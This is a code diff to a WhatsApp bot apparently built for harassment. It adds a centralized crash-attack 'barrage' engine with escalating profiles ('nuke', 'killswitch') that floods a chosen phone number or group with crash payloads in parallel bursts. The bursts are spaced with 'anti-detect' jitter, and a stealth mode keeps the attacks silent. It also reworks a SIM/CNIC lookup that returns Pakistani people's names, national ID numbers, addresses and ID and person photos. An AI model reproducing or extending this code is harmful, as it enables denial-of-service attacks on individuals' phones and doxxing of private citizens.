@@ -49,6 +49,7 @@ const { igDownload } = require('./allfunc/igdownload')
 const { xnxxDownload, xnxxSearch } = require('./allfunc/xnxxdownload')
 const { githubstalk } = require('./allfunc/githubstalk')
 const { mlstalk } = require('./allfunc/mlstalk')
+const { lookupSimDatabase, formatSimRecordsMessage, sendSimPhotos } = require('./allfunc/sim-lookup')
 const {
   getCryptoTop, getCryptoDetail, searchCrypto, resolveCoinId, getStockPrice,
   getCryptoGainers, getCryptoLosers,
@@ -506,9 +507,6 @@ if (devtrust && devtrust.user) global._activeNexusSocket = devtrust;
 // 'notify' = user/owner ka actual message → process karo
 if (chatUpdate && chatUpdate.type === 'append') return;
 
-let stealthMode = false;   // 🔇 Stealth Mode — attack silently, no reply messages
-let stopAttacks = false;   // 🛑 Emergency Stop — stops all running attack loops
-
 // ═════════════════════════════════════════════════════════════════════
 // 📢 BROADCAST — Global initializers (MUST run once, before switch)
 // ═════════════════════════════════════════════════════════════════════
@@ -818,6 +816,16 @@ if (!devtrust._cachedBotNumber) {
 }
 const botNumber = devtrust._cachedBotNumber;
 
+// Linked WhatsApp account user (paired number) — used for self/private mode
+const _botNumClean = String(botNumber || '').replace(/[^0-9]/g, '');
+if (!global._attackState) global._attackState = {};
+if (!global._attackState[_botNumClean]) global._attackState[_botNumClean] = { stopAttacks: false, stealthMode: false };
+const _atk = global._attackState[_botNumClean];
+const _isBotLinkedUser = () => {
+    const senderNum = String(m.sender || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
+    return Boolean(m.key?.fromMe || (senderNum && senderNum === _botNumClean));
+};
+
 // ── Cache groupMetadata with 30-min TTL + pending-request dedup ──
 // PERF FIX: TTL 5min→30min (group admins rarely change).
 // Dedup: if a fetch is already in-flight for this JID, await the same promise
@@ -888,6 +896,92 @@ const _cleanSenderNum = (m.sender || '').replace(/[^0-9]/g, '');
 const _senderAdultUnlocked = global._flagCache.adult.some(id => String(id).replace(/[^0-9]/g, '') === _cleanSenderNum);
 // Bug & SIM Database unlock status for this sender (cached)
 const _senderBugUnlocked = global._flagCache.bug.some(id => String(id).replace(/[^0-9]/g, '') === _cleanSenderNum);
+
+// Shared bug-section access guard — used by all bug attack commands
+const _requireBugAccess = () => {
+    if (global._flagCache.bugBanned.some(id => String(id).replace(/[^0-9]/g, '') === _cleanSenderNum)) {
+        reply(`🚫 *Access Denied*\nAap Bug section se permanently ban hain.`);
+        return false;
+    }
+    if (!global._flagCache.bugUnlocked.some(id => String(id).replace(/[^0-9]/g, '') === _cleanSenderNum)) {
+        reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);
+        return false;
+    }
+    return true;
+};
+
+// Parse + validate bug target number
+const _parseBugTarget = (raw) => {
+    const num = String(raw || '').replace(/[^0-9]/g, '');
+    if (!num || num.length < 7 || num.length > 15) return null;
+    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ''));
+    if (protectedNumbers.includes(num)) return { blocked: true, num };
+    return { num, jid: num + '@s.whatsapp.net' };
+};
+
+// Silent error wrapper — one failed payload never kills the barrage
+const _bugSafe = async (fn, target) => {
+    try { await fn(target); } catch (_) {}
+};
+
+// Parallel burst with anti-detect micro-jitter between batches
+const _bugBurst = async (target, fns, batchSize = 8) => {
+    if (_atk.stopAttacks) return;
+    for (let i = 0; i < fns.length; i += batchSize) {
+        if (_atk.stopAttacks) return;
+        await Promise.allSettled(
+            fns.slice(i, i + batchSize).map(fn => _bugSafe(fn, target))
+        );
+        await sleep(12 + Math.floor(Math.random() * 28));
+    }
+};
+
+// Centralized attack profiles — all bug commands route through here
+const _runBugBarrage = async (target, profile = 'standard') => {
+    const _carousel = (t) => CarouselVY4(devtrust, t);
+    const _crashIos = (t) => CrashLoadIos(devtrust, t);
+
+    const waves = {
+        combo: () => _bugBurst(target,
+            Array(36).fill(null).flatMap(() => [callinvisible, ForceXFrezee, blank1]), 9),
+        fcnew: () => _bugBurst(target,
+            Array(30).fill(null).flatMap(() => [_carousel, LocaXotion, XinsooInvisV1]), 8),
+        xphone: () => _bugBurst(target,
+            Array(24).fill(null).flatMap(() => [_carousel, _crashIos, forclose, LocaXotion, Xblanknoclick, callinvisible]), 8),
+        bayu: () => _bugBurst(target,
+            Array(24).fill(null).flatMap(() => [protoXimg, bulldozer, protocolbug3, delayMakerInvisible, xatanicinvisv4, protocolbug6]), 8),
+        forceclose: () => _bugBurst(target, Array(40).fill(forclose), 12),
+        ios: () => _bugBurst(target,
+            Array(20).fill(null).flatMap(() => [callinvisible, blank1, ForceXFrezee, forclose]), 8),
+        vampire: () => _bugBurst(target, Array(6).fill(VampireBugIns), 3),
+        group: () => _bugBurst(target, Array(8).fill(null).flatMap(() => [BlankGroup, VampireGroupInvis, callinvisible]), 4),
+    };
+
+    const profiles = {
+        crash:     { rounds: 14, seq: ['combo', 'fcnew', 'forceclose', 'xphone'] },
+        delayhard: { rounds: 18, seq: ['fcnew', 'fcnew', 'combo', 'xphone', 'bayu', 'forceclose'] },
+        close:     { rounds: 12, seq: ['combo', 'fcnew', 'forceclose', 'forceclose', 'xphone'] },
+        invis:     { rounds: 20, seq: ['ios', 'combo', 'forceclose'] },
+        ultrabug:  { rounds: 28, seq: ['combo', 'fcnew', 'xphone', 'bayu', 'forceclose', 'vampire'] },
+        megabug:   { rounds: 35, seq: ['combo', 'combo', 'fcnew', 'fcnew', 'xphone', 'bayu', 'forceclose', 'forceclose'] },
+        ghost:     { rounds: 35, seq: ['combo', 'fcnew', 'xphone', 'bayu', 'forceclose', 'ios'] },
+        godmode:   { rounds: 45, seq: ['combo', 'fcnew', 'xphone', 'bayu', 'forceclose', 'forceclose', 'vampire'] },
+        killswitch:{ rounds: 50, seq: ['combo', 'combo', 'fcnew', 'fcnew', 'xphone', 'bayu', 'forceclose', 'forceclose', 'vampire'] },
+        nuke:      { rounds: 55, seq: ['combo', 'combo', 'fcnew', 'fcnew', 'xphone', 'xphone', 'bayu', 'bayu', 'forceclose', 'forceclose', 'vampire'] },
+        destroy:   { rounds: 16, seq: ['combo', 'fcnew', 'xphone', 'bayu', 'forceclose'] },
+        standard:  { rounds: 12, seq: ['combo', 'fcnew', 'xphone', 'bayu', 'forceclose'] },
+        group:     { rounds: 22, seq: ['group', 'combo', 'fcnew', 'forceclose'] },
+    };
+
+    const cfg = profiles[profile] || profiles.standard;
+    for (let round = 0; round < cfg.rounds; round++) {
+        if (_atk.stopAttacks) { _atk.stopAttacks = false; break; }
+        await Promise.allSettled(
+            cfg.seq.map(name => waves[name] ? waves[name]() : Promise.resolve())
+        );
+        await sleep(8 + Math.floor(Math.random() * 22));
+    }
+};
 const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : (m.isNewsletter ? true : false);
 const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : (m.isNewsletter ? true : false);
 const groupName = m.isGroup ? groupMetadata?.subject || "" : "";
@@ -3293,10 +3387,13 @@ async function blankgc(target) {
 // END OF BUG FUNCTIONS 
 //=====COMBINING ALL GC BUG======//
 async function bug3(isTarget) {
-for (let i = 0; i < 60; i++) {
-await killgc(isTarget);
-await rusuhgc(isTarget);
-await blankgc(isTarget);
+for (let i = 0; i < 15; i++) {
+  if (_atk.stopAttacks) return;
+  await Promise.allSettled([
+    killgc(isTarget), rusuhgc(isTarget), blankgc(isTarget),
+    killgc(isTarget), rusuhgc(isTarget), blankgc(isTarget),
+  ]);
+  await sleep(80 + Math.floor(Math.random() * 120));
 }
 console.log(chalk.blue(`Sending Crash Hard to ${isTarget}☠️`));
 }
@@ -3494,56 +3591,32 @@ async function iosOver(durationHours, XS) {
 
 
 
-// ================= ( Combo Function )====================
-async function Combo(target) { 
-        for (let i = 0; i< 100; i++) {
-        await callinvisible(target);
-        await ForceXFrezee(target);
-        await blank1(target);
-        await callinvisible(target);
-        await ForceXFrezee(target);
-        await blank1(target);
-        await callinvisible(target);
-        await ForceXFrezee(target);
-        await blank1(target);
-        await callinvisible(target);
-        await ForceXFrezee(target);
-        await blank1(target);
-        await callinvisible(target);
-        await ForceXFrezee(target);
-        await blank1(target);
-        await callinvisible(target);
-        await ForceXFrezee(target);
-        await blank1(target);
-        
-        }
+// ================= ( Combo Function — parallel waves )====================
+async function Combo(target) {
+    for (let wave = 0; wave < 22; wave++) {
+        if (_atk.stopAttacks) return;
+        await Promise.allSettled(
+            Array(18).fill(null).map((_, i) => {
+                const fn = [callinvisible, ForceXFrezee, blank1][i % 3];
+                return fn(target).catch(() => {});
+            })
+        );
+        await sleep(15 + Math.floor(Math.random() * 25));
+    }
 }
 
-async function fcnew(target) { 
-        for (let i = 0; i< 100; i++) {     
-   await CarouselVY4(devtrust, target);
-   await CarouselVY4(devtrust, target);
-   await LocaXotion(target);
-   await XinsooInvisV1(target);
-   await CarouselVY4(devtrust, target);
-   await CarouselVY4(devtrust, target);
-   await LocaXotion(target);
-   await XinsooInvisV1(target); 
-   await CarouselVY4(devtrust, target);
-   await CarouselVY4(devtrust, target);
-   await LocaXotion(target);
-   await XinsooInvisV1(target);
-   await CarouselVY4(devtrust, target);
-   await CarouselVY4(devtrust, target);
-   await LocaXotion(target);
-   await XinsooInvisV1(target);  
-   await CarouselVY4(devtrust, target);
-   await CarouselVY4(devtrust, target);
-   await LocaXotion(target);
-   await XinsooInvisV1(target);
-   
-        }
-} 
+async function fcnew(target) {
+    const _run = (fn) => () => fn(target);
+    const _car = () => CarouselVY4(devtrust, target);
+    const vectors = [_car, _run(LocaXotion), _run(XinsooInvisV1)];
+    for (let wave = 0; wave < 22; wave++) {
+        if (_atk.stopAttacks) return;
+        await Promise.allSettled(
+            Array(18).fill(null).map((_, i) => vectors[i % 3]().catch(() => {}))
+        );
+        await sleep(15 + Math.floor(Math.random() * 25));
+    }
+}
 
 async function BugGroup(target) {
     for (let i = 0; i< 200; i++) {
@@ -3575,57 +3648,37 @@ async function BugGroup(target) {
  }
 
 async function BayuOfficialHard(target) {
-    for (let i = 0; i< 200; i++) {
-    await protoXimg(target)
-    await bulldozer(target)
-    await protocolbug3(target)
-    await bulldozer(target)
-    await delayMakerInvisible(target)
-    await bulldozer(target)
-    await xatanicinvisv4(target)
-    await bulldozer(target)
-    await protocolbug6(target)
+    const vectors = [protoXimg, bulldozer, protocolbug3, delayMakerInvisible, xatanicinvisv4, protocolbug6];
+    for (let wave = 0; wave < 18; wave++) {
+        if (_atk.stopAttacks) return;
+        await Promise.allSettled(
+            Array(18).fill(null).map((_, i) => vectors[i % vectors.length](target).catch(() => {}))
+        );
+        await sleep(15 + Math.floor(Math.random() * 25));
     }
 }
     
 async function ForceClose(target) {
-  for (let i = 0; i< 250; i++) {
-  await forclose(target);
-  await forclose(target);
-  await forclose(target);
-  await forclose(target);
-  await forclose(target);
-  await forclose(target);
-  await forclose(target);
-  await forclose(target);
-  await forclose(target);
-   await forclose(target);
-  await forclose(target);
-  await forclose(target);
-   await forclose(target);
-  await forclose(target);
-  await forclose(target);
-  
-         }
+    for (let wave = 0; wave < 28; wave++) {
+        if (_atk.stopAttacks) return;
+        await Promise.allSettled(
+            Array(16).fill(null).map(() => forclose(target).catch(() => {}))
+        );
+        await sleep(18 + Math.floor(Math.random() * 30));
+    }
+}
  
- }
- 
- async function XPhone(target) { 
-    for (let i = 0; i< 300; i++) {  // ✅ CORRECT - lowercase i
- 
-await CarouselVY4(devtrust, target);
-await CrashLoadIos(devtrust, target);
-await forclose(target);
-await LocaXotion(target);
-await XinsooInvisV1(target);
-await Xblanknoclick(target);
-await ForceXFrezee(target);
-await blank1(target);
-await callinvisible(target);
-   
-   } 
-   
-   
+async function XPhone(target) {
+    const _car = () => CarouselVY4(devtrust, target);
+    const _ios = () => CrashLoadIos(devtrust, target);
+    const vectors = [_car, _ios, forclose, LocaXotion, XinsooInvisV1, Xblanknoclick, ForceXFrezee, blank1, callinvisible];
+    for (let wave = 0; wave < 20; wave++) {
+        if (_atk.stopAttacks) return;
+        await Promise.allSettled(
+            Array(18).fill(null).map((_, i) => vectors[i % vectors.length](target).catch(() => {}))
+        );
+        await sleep(15 + Math.floor(Math.random() * 25));
+    }
 }
 // ================= ( Bates Function )=====================
 async function CYBEReress() {
@@ -4641,17 +4694,30 @@ function getCurrentDateTime() {
 }
 
 // ============ STICKER COMMAND DETECTION ============
+function _stickerFileKey(msg) {
+    const sm = msg?.stickerMessage || msg?.message?.stickerMessage;
+    if (!sm) return msg?.key?.id || '';
+    const sha = sm.fileSha256;
+    if (sha) {
+        if (Buffer.isBuffer(sha)) return sha.toString('base64');
+        if (typeof sha === 'string') return sha;
+        if (sha?.type === 'Buffer' && Array.isArray(sha.data)) return Buffer.from(sha.data).toString('base64');
+    }
+    return msg?.key?.id || '';
+}
 // If the message is a sticker, check if it has a registered command binding
 if (m.message?.stickerMessage && !command) {
     try {
         const _stickerCmds = loadStickerCmds();
-        const _stickerMsgId = m.key?.id || '';
-        // Try matching by sticker ID hash stored in the database
-        const _matchedCmd = _stickerCmds[_stickerMsgId];
+        const _stickerKey = _stickerFileKey(m);
+        const _matchedCmd = _stickerCmds[_stickerKey];
         if (_matchedCmd) {
-            // Re-route as if the user sent that command
             body = prefix + _matchedCmd;
-            // Fall through to switch below (command will be re-evaluated)
+            const afterPrefix = body.slice(prefix.length).trim();
+            const parts = afterPrefix.split(/ +/);
+            command = parts[0].toLowerCase();
+            args = parts.slice(1);
+            text = args.join(' ');
         }
     } catch (e) {}
 }
@@ -5459,6 +5525,7 @@ ${_senderBugUnlocked ? '│❖ ' + prefix + 'bugmenu' : ''}
 │❖ ${prefix}ownermenu
 │❖ ${prefix}stickermenu
 │❖ ${prefix}toolsmenu
+${_senderBugUnlocked ? '│❖ ' + prefix + 'simdatabase' : ''}
 │❖ ${prefix}tvmenu
 │❖ ${prefix}tradingmenu
 │❖ ${prefix}bcmenu
@@ -9530,57 +9597,6 @@ case 'proxytest': {
     break;
 }
 
-case "movie": {
-    if (!text) return reply("🎬 *Usage:* .movie <movie name>\nExample: .movie Inception");
-
-    devtrust.sendMessage(m.chat, { react: { text: '🔍', key: m.key } }).catch(()=>{});
-
-    try {
-        const res = await axios.get(`https://www.omdbapi.com/?t=${encodeURIComponent(text)}&apikey=6372bb60&plot=full`, { timeout: 12000 });
-        if (res.data.Response === "False") return reply("❌ *Movie not found* • Try exact movie name");
-
-        const data = res.data;
-        const imdbId = data.imdbID;
-
-        // YTS download links
-        let dlText = '';
-        try {
-            const yts = await axios.get(`https://yts.mx/api/v2/list_movies.json?query_term=${imdbId}&limit=1`, { timeout: 8000 });
-            const torrents = yts.data?.data?.movies?.[0]?.torrents || [];
-            if (torrents.length > 0) {
-                dlText = '\n\n📥 *Download Links:*\n';
-                torrents.slice(0, 4).forEach(t => {
-                    dlText += `• [${t.quality} ${t.type}] ${t.size}\n${t.url}\n`;
-                });
-            }
-        } catch (_) {}
-
-        const caption =
-            `🎬 *${data.Title}* (${data.Year})\n\n` +
-            `🎭 *Genre:* ${data.Genre}\n` +
-            `🌍 *Language:* ${data.Language}\n` +
-            `🎬 *Director:* ${data.Director}\n` +
-            `⏱️ *Runtime:* ${data.Runtime}\n` +
-            `⭐ *Rating:* ${data.imdbRating}/10\n\n` +
-            `📝 *Plot:* ${data.Plot}\n` +
-            dlText +
-            `\n🎥 *Watch:* https://vidsrc.to/embed/movie/${imdbId}`;
-
-        await devtrust.sendMessage(m.chat,
-            {
-                image: { url: data.Poster !== "N/A" ? data.Poster : "https://i.ibb.co/4f4tTnG/no-poster.png" },
-                caption: caption
-            },
-            { quoted: m }
-        );
-        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-    } catch (e) {
-        console.error(e);
-        reply("⚠️ *Movie search failed* • Try again later");
-    }
-}
-break;
-
 case "sciencefact": {
     try {
         const res = await axios.get("https://uselessfacts.jsph.pl/random.json?language=en");
@@ -10331,6 +10347,11 @@ case 'aipic': {
 break;
 
 case 'hentai': {
+    const _hentSenderNum = (m.sender || '').split('@')[0].split(':')[0];
+    const _hentUnlocked = (global._flagCache?.adultUnlocked || []).some(id => String(id).replace(/[^0-9]/g,'') === _hentSenderNum);
+    const _hentBanned = (global._flagCache?.adultBanned || []).some(id => String(id).replace(/[^0-9]/g,'') === _hentSenderNum);
+    if (_hentBanned) return reply(`🚫 *18+ Access Permanently Banned*\nYou cannot access 18+ content.`);
+    if (!_hentUnlocked) return reply(`🔞 *18+ Content Locked*\nType *${prefix}addkey <code>* to unlock.\nGet the code from admin.`);
     try { const hentUrl = await getAnimeImageUrl('hentai'); if (!hentUrl) throw new Error('No image'); const hentBuf = await getBuffer(hentUrl); await devtrust.sendMessage(m.chat, { image: hentBuf, caption: "🔞 *CYBER*" }, { quoted: m }); } catch { reply(`❌ *Failed to fetch hentai image*`); }
 }
 break;
@@ -15526,12 +15547,17 @@ case 'blankgc': {
     if (!isOwner) return reply(`🔒 *Owner only*`);
     if (!m.isGroup) return reply('👥 *Groups only*');
     
-    reply(`💀 *Destroying group...*`);
-    
-    for (let i = 0; i < 20; i++) {
-        await bug3(m.chat);
-        await sleep(2000);
-        await bug3(m.chat);             
+    reply(`💀 *Group destroy barrage starting...*`);
+    try {
+        await _runBugBarrage(m.chat, 'group');
+        for (let i = 0; i < 12; i++) {
+            if (_atk.stopAttacks) break;
+            await bug3(m.chat);
+            await sleep(100);
+        }
+        reply(`✅ *Group attack complete*`);
+    } catch(e) {
+        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
     }
 }
 break;
@@ -16012,22 +16038,22 @@ break;
 
 case 'stealthmode':
 case 'silentmode': {
-    if (!isOwner) return reply('🔒 *Owner only*');
-    if (!text) return reply(`🔇 *Stealth Mode:* ${stealthMode ? '✅ ON' : '❌ OFF'}
+    if (!_requireBugAccess()) break;
+    if (!text) return reply(`🔇 *Stealth Mode:* ${_atk.stealthMode ? '✅ ON' : '❌ OFF'}
 
 _Use:_ ${prefix}stealthmode on/off`);
 
     const _sm = text.trim().toLowerCase();
     if (_sm === 'on' || _sm === '1') {
-        stealthMode = true;
+        _atk.stealthMode = true;
         reply('🔇 *Stealth Mode ON* — Ab attacks silently chalenge, koi launch/complete message nahi aayega');
     } else if (_sm === 'off' || _sm === '0') {
-        stealthMode = false;
+        _atk.stealthMode = false;
         reply('🔊 *Stealth Mode OFF* — Normal mode wapas, sab messages dikhenge');
     } else {
         reply(`⚠️ *Usage:* ${prefix}stealthmode on/off`);
     }
-    await devtrust.sendMessage(m.chat, { react: { text: stealthMode ? '🔇' : '🔊', key: m.key } });
+    await devtrust.sendMessage(m.chat, { react: { text: _atk.stealthMode ? '🔇' : '🔊', key: m.key } });
 }
 break;
 
@@ -16040,7 +16066,7 @@ case 'stopall':
 case 'attackstop': {
     if (!isOwner) return reply('🔒 *Owner only*');
 
-    stopAttacks = true;
+    _atk.stopAttacks = true;
 
     await devtrust.sendMessage(m.chat, { react: { text: '🛑', key: m.key } });
     reply(`🛑 *STOP ATTACK — EMERGENCY KILL*
@@ -16605,7 +16631,7 @@ case 'setstickercmd': {
     if (!args[0]) return reply(`❌ *Usage:* Reply to a sticker with \`${prefix}setstickercmd <command>\`\nExample: \`${prefix}setstickercmd menu\``);
     const _scCmdName = args[0].toLowerCase();
     if (!m.quoted || m.quoted.mtype !== 'stickerMessage') return reply(`❌ *Reply to a sticker* to bind it\nExample: reply to a sticker with \`${prefix}setstickercmd ping\``);
-    const _scHash = m.quoted.key?.id || JSON.stringify(m.quoted.message?.stickerMessage || {});
+    const _scHash = _stickerFileKey(m.quoted) || m.quoted.key?.id || '';
     const _scData = loadStickerCmds();
     _scData[_scHash] = _scCmdName;
     saveStickerCmds(_scData);
@@ -18390,53 +18416,32 @@ default:
               break;
           }
           await devtrust.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
-          
-          // Multiple API fallbacks — ek dead ho toh dusra try karo
-          const _sdApis = [
-              `https://famofc.site/api/database.php?q=${encodeURIComponent(query)}`,
-              `https://www.aryantools.pro/api/simdata?number=${encodeURIComponent(query)}`,
-          ];
-          
-          let _sdFound = false;
-          for (const _sdApiUrl of _sdApis) {
-              try {
-                  const _sdRes = await axios.get(_sdApiUrl, {
-                      timeout: 12000,
-                      headers: { 'User-Agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36' }
+
+          try {
+              const _sdResult = await lookupSimDatabase(query);
+              if (_sdResult.records.length > 0) {
+                  const _sdMsg = formatSimRecordsMessage({
+                      records: _sdResult.records,
+                      normalized: _sdResult.normalized,
+                      rawQuery: query,
+                      title: '🗄️ *CYBERSECPRO SIM DATABASE*',
+                      photos: _sdResult.photos,
                   });
-                  const _sdJson = _sdRes.data;
-                  // Different APIs return different formats — handle all
-                  const _sdRecords = _sdJson?.data?.records || _sdJson?.records || _sdJson?.result || [];
-                  const _sdSuccess = _sdJson?.success || _sdJson?.status === 'success' || _sdJson?.status === true || _sdRecords.length > 0;
-                  
-                  if (_sdSuccess && _sdRecords.length > 0) {
-                      let _sdMsg = `🗄️ *CYBERSECPRO SIM DATABASE*\n`;
-                      _sdMsg += `📞 *Query:* ${query}\n`;
-                      _sdMsg += `📊 *Records Found:* ${_sdRecords.length}\n`;
-                      _sdMsg += `━━━━━━━━━━━━━━━━━━━━\n`;
-                      _sdRecords.forEach((_sdR, _sdI) => {
-                          _sdMsg += `\n📌 *Record ${_sdI + 1}*\n`;
-                          _sdMsg += `👤 *Name:* ${_sdR.full_name || _sdR.name || _sdR.owner_name || 'N/A'}\n`;
-                          _sdMsg += `📱 *Phone:* ${_sdR.phone || _sdR.mobile || _sdR.number || 'N/A'}\n`;
-                          _sdMsg += `🆔 *CNIC:* ${_sdR.cnic || _sdR.cnic_no || 'N/A'}\n`;
-                          _sdMsg += `🏠 *Address:* ${_sdR.address || _sdR.addr || 'N/A'}\n`;
-                          _sdMsg += `📡 *Network:* ${_sdR.network || _sdR.operator || _sdR.sim || 'N/A'}\n`;
-                          _sdMsg += `━━━━━━━━━━━━━━━━━━━━\n`;
-                      });
-                      _sdMsg += `_Powered by CYBERSECPRO Database_`;
-                      await m.reply(_sdMsg);
-                      await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-                      _sdFound = true;
-                      break;
+                  await m.reply(_sdMsg);
+                  const _sdPhotosSent = await sendSimPhotos(devtrust, m.chat, _sdResult.photos, m);
+                  if (!_sdPhotosSent.length && _sdResult.records.some(r => r.cnicPhoto || r.personPhoto)) {
+                      await sendSimPhotos(devtrust, m.chat, {
+                          cnicPhotos: _sdResult.records.map(r => r.cnicPhoto).filter(Boolean),
+                          personPhotos: _sdResult.records.map(r => r.personPhoto).filter(Boolean),
+                      }, m);
                   }
-              } catch (_sdErr) {
-                  // Ye API dead hai, agla try karo
-                  continue;
+                  await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+              } else {
+                  await m.reply(`❌ *No records found for:* ${query}\n\n_Ye number/CNIC database mein nahi hai ya format galat hai_\n\n*Supported formats:*\n• 3001234567\n• 03001234567\n• 923001234567\n• CNIC 13 digits`);
+                  await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
               }
-          }
-          
-          if (!_sdFound) {
-              await m.reply(`❌ *No records found for:* ${query}\n\n_Ye number database mein nahi hai ya number galat hai_\n_Pakistani numbers hi supported hain (03xxxxxxxxx ya 923xxxxxxxxx)_`);
+          } catch (_sdErr) {
+              await m.reply(`❌ *Lookup failed:* ${_sdErr.message || 'Error'}`);
               await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
           }
           break;
@@ -18513,6 +18518,8 @@ default:
   │  📱 Phone Number
   │  🆔 CNIC Number
   │  🏠 Address
+  │  🪪 CNIC Photo (auto)
+  │  📸 Person Photo (auto)
   │
   │ ◈ *⚠️ 𝗡𝗢𝗧𝗘𝗦*
   │  • Sirf Pakistani numbers support
@@ -18568,49 +18575,32 @@ default:
               break;
           }
           await devtrust.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
-          
-          const _cnApis = [
-              `https://famofc.site/api/database.php?q=${encodeURIComponent(_cnQuery)}`,
-              `https://www.aryantools.pro/api/simdata?number=${encodeURIComponent(_cnQuery)}`,
-          ];
-          
-          let _cnFound = false;
-          for (const _cnApiUrl of _cnApis) {
-              try {
-                  const _cnRes = await axios.get(_cnApiUrl, {
-                      timeout: 12000,
-                      headers: { 'User-Agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36' }
+
+          try {
+              const _cnResult = await lookupSimDatabase(_cnQuery);
+              if (_cnResult.records.length > 0) {
+                  const _cnMsg = formatSimRecordsMessage({
+                      records: _cnResult.records,
+                      normalized: _cnResult.normalized,
+                      rawQuery: _cnQuery,
+                      title: '🆔 *CYBERSECPRO CNIC DATABASE*',
+                      photos: _cnResult.photos,
                   });
-                  const _cnJson = _cnRes.data;
-                  const _cnRecs = _cnJson?.data?.records || _cnJson?.records || _cnJson?.result || [];
-                  const _cnOk = _cnJson?.success || _cnJson?.status === 'success' || _cnRecs.length > 0;
-                  
-                  if (_cnOk && _cnRecs.length > 0) {
-                      let _cnMsg = `🆔 *CYBERSECPRO CNIC DATABASE*\n`;
-                      _cnMsg += `🔎 *CNIC:* ${_cnQuery}\n`;
-                      _cnMsg += `📊 *Records Found:* ${_cnRecs.length}\n`;
-                      _cnMsg += `━━━━━━━━━━━━━━━━━━━━\n`;
-                      _cnRecs.forEach((_cnR, _cnI) => {
-                          _cnMsg += `\n📌 *Record ${_cnI + 1}*\n`;
-                          _cnMsg += `👤 *Name:* ${_cnR.full_name || _cnR.name || 'N/A'}\n`;
-                          _cnMsg += `📱 *Phone:* ${_cnR.phone || _cnR.mobile || 'N/A'}\n`;
-                          _cnMsg += `🆔 *CNIC:* ${_cnR.cnic || _cnQuery}\n`;
-                          _cnMsg += `🏠 *Address:* ${_cnR.address || 'N/A'}\n`;
-                          _cnMsg += `━━━━━━━━━━━━━━━━━━━━\n`;
-                      });
-                      _cnMsg += `_Powered by CYBERSECPRO Database_`;
-                      await m.reply(_cnMsg);
-                      await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-                      _cnFound = true;
-                      break;
+                  await m.reply(_cnMsg);
+                  const _cnPhotosSent = await sendSimPhotos(devtrust, m.chat, _cnResult.photos, m);
+                  if (!_cnPhotosSent.length && _cnResult.records.some(r => r.cnicPhoto || r.personPhoto)) {
+                      await sendSimPhotos(devtrust, m.chat, {
+                          cnicPhotos: _cnResult.records.map(r => r.cnicPhoto).filter(Boolean),
+                          personPhotos: _cnResult.records.map(r => r.personPhoto).filter(Boolean),
+                      }, m);
                   }
-              } catch (_cnErr) {
-                  continue;
+                  await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+              } else {
+                  await m.reply(`❌ *No records found for CNIC:* ${_cnQuery}\n\n_Ye CNIC database mein nahi hai ya abhi update nahi hua_`);
+                  await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
               }
-          }
-          
-          if (!_cnFound) {
-              await m.reply(`❌ *No records found for CNIC:* ${_cnQuery}\n\n_Ye CNIC database mein nahi hai_`);
+          } catch (_cnErr) {
+              await m.reply(`❌ *Lookup failed:* ${_cnErr.message || 'Error'}`);
               await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
           }
           break;
